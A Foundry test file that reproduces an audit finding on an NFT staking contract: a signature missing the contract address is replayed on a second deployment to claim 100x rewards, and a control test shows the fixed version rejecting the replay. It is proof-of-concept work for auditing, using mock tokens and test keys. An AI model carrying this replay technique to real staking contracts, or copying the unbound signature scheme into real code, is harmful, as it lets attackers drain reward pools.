// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    NFTStaking,
    NFTStakingFixed,
    MiniToken,
    MockERC721
} from "./63684-h-01-cross-contract-signature-replay-allows-users-to-inflate.sol";

// HYBUX finding 63684 — Cross-contract signature replay in NFTStaking._stakeNFTs.
//
// The signed digest keccak256(abi.encode(_sender,_tokenIds,_rarityWeightIndexes))
// omits address(this), so a rarity authorization signed for one NFTStaking
// deployment validates verbatim on a second deployment sharing the signer. An
// attacker credits a common (weight-1) NFT on deployment B with the legendary
// (weight-100) multiplier from a signature meant for deployment A, and claims
// 100x the rewards a common NFT is entitled to.
contract CrossContractSignatureReplayTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant TOKEN_ID = 100;
    uint256 internal constant LEGENDARY_INDEX = 3; // weight 100
    uint256 internal constant COMMON_INDEX = 0; // weight 1

    function test_exploit_crossContractSignatureReplay_inflatesRewards() public {
        Exploit e = new Exploit();
        e.run();

        // Deployment B (GRAYBOYS) recorded LEGENDARY weight for a COMMON NFT.
        assertEq(e.recordedWeightOnB(), 100, "common NFT credited legendary weight on B");
        assertEq(e.honestCommonWeight(), 1, "grayboys #100 is genuinely common (weight 1)");

        // Reward inflated exactly 100x vs the weight-1 baseline (99x over-payment).
        assertEq(e.honestBaseline(), 1_000 ether, "weight-1 baseline reward");
        assertEq(e.inflatedReward(), 100_000 ether, "legendary-weight reward claimed");
        assertEq(e.inflatedReward(), 100 * e.honestBaseline(), "reward inflated 100x");

        // Attacker walked away with the full inflated REWARD-HYBUX payout.
        MiniToken reward = MiniToken(e.rewardAddr());
        assertEq(reward.balanceOf(ATTACKER), 100_000 ether, "attacker holds inflated REWARD-HYBUX");
        assertEq(e.attackerReward(), 100_000 ether, "exploit-exposed attacker reward");

        // The over-payment (harm) is 99x the baseline the common NFT deserved.
        assertEq(e.inflatedReward() - e.honestBaseline(), 99_000 ether, "99x over-payment extracted");
    }

    // Negative control: the FIXED contract binds address(this) into the digest, so a
    // signature authorized for deployment A is REJECTED when replayed on deployment B.
    function test_control_fixedDomainSeparation_rejectsReplay() public {
        (uint256 pk, address signer) = _signer();

        uint256[] memory weights = new uint256[](4);
        weights[0] = 1;
        weights[1] = 5;
        weights[2] = 20;
        weights[3] = 100;

        MiniToken reward = new MiniToken("HYBUX Reward", "REWARD-HYBUX");
        MockERC721 worlds = new MockERC721("Worlds", "WRLD");
        MockERC721 grayboys = new MockERC721("Grayboys", "GRAY");
        NFTStakingFixed stakingA = new NFTStakingFixed(signer, address(worlds), address(reward), weights);
        NFTStakingFixed stakingB = new NFTStakingFixed(signer, address(grayboys), address(reward), weights);

        worlds.mint(address(this), TOKEN_ID);
        grayboys.mint(address(this), TOKEN_ID);
        worlds.setApprovalForAll(address(stakingA), true);
        grayboys.setApprovalForAll(address(stakingB), true);
        reward.mint(address(stakingA), 1_000_000 ether);
        reward.mint(address(stakingB), 1_000_000 ether);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = TOKEN_ID;
        uint256[] memory legendaryIdx = new uint256[](1);
        legendaryIdx[0] = LEGENDARY_INDEX;

        // Signer authorizes the legendary stake for deployment A specifically (address(this)=A).
        bytes memory sigForA =
            _sign(pk, ATTACKER, tokenIds, legendaryIdx, address(stakingA));

        // Legit on A.
        stakingA.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sigForA);
        assertEq(stakingA.stakedWeight(TOKEN_ID), 100, "A: legendary recorded");

        // Replay on B is now rejected — the digest binds B's address, which differs.
        vm.expectRevert(bytes("invalid signature"));
        stakingB.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sigForA);

        // Nothing was credited on B; no reward can be siphoned.
        assertEq(stakingB.stakedWeight(TOKEN_ID), 0, "B: replay rejected, no weight credited");
    }

    // Cross-check the exploit end-to-end against the VULNERABLE contract using a
    // freshly vm.signed signature (independent of the Exploit's baked constant),
    // proving the replay is a property of the code, not of a hardcoded blob.
    function test_exploit_vmSigned_replayAcrossDeployments() public {
        (uint256 pk, address signer) = _signer();

        uint256[] memory weights = new uint256[](4);
        weights[0] = 1;
        weights[1] = 5;
        weights[2] = 20;
        weights[3] = 100;

        MiniToken reward = new MiniToken("HYBUX Reward", "REWARD-HYBUX");
        MockERC721 worlds = new MockERC721("Worlds", "WRLD");
        MockERC721 grayboys = new MockERC721("Grayboys", "GRAY");
        NFTStaking stakingA = new NFTStaking(signer, address(worlds), address(reward), weights);
        NFTStaking stakingB = new NFTStaking(signer, address(grayboys), address(reward), weights);

        worlds.mint(address(this), TOKEN_ID);
        grayboys.mint(address(this), TOKEN_ID);
        worlds.setApprovalForAll(address(stakingA), true);
        grayboys.setApprovalForAll(address(stakingB), true);
        reward.mint(address(stakingA), 1_000_000 ether);
        reward.mint(address(stakingB), 1_000_000 ether);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = TOKEN_ID;
        uint256[] memory legendaryIdx = new uint256[](1);
        legendaryIdx[0] = LEGENDARY_INDEX;

        // Signer authorizes the legendary rarity WITHOUT any deployment binding (the bug).
        bytes memory sig = _signVulnerable(pk, ATTACKER, tokenIds, legendaryIdx);

        stakingA.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sig); // legit
        stakingB.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sig); // REPLAY — accepted

        assertEq(stakingB.stakedWeight(TOKEN_ID), 100, "replayed legendary weight on B");
        uint256 claimed = stakingB.claim(TOKEN_ID);
        assertEq(claimed, 100_000 ether, "100x reward claimed on B");
        assertEq(reward.balanceOf(ATTACKER), 100_000 ether, "attacker received inflated reward");
    }

    function _signer() internal returns (uint256 pk, address addr) {
        pk = 1; // matches the synthetic's baked signer (0x7E5F…Bdf)
        addr = vm.addr(pk);
    }

    function _signVulnerable(
        uint256 pk,
        address sender,
        uint256[] memory tokenIds,
        uint256[] memory idx
    ) internal returns (bytes memory) {
        bytes32 hash = keccak256(abi.encode(sender, tokenIds, idx));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _sign(
        uint256 pk,
        address sender,
        uint256[] memory tokenIds,
        uint256[] memory idx,
        address boundContract
    ) internal returns (bytes memory) {
        bytes32 hash = keccak256(abi.encode(sender, tokenIds, idx, boundContract));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }
}
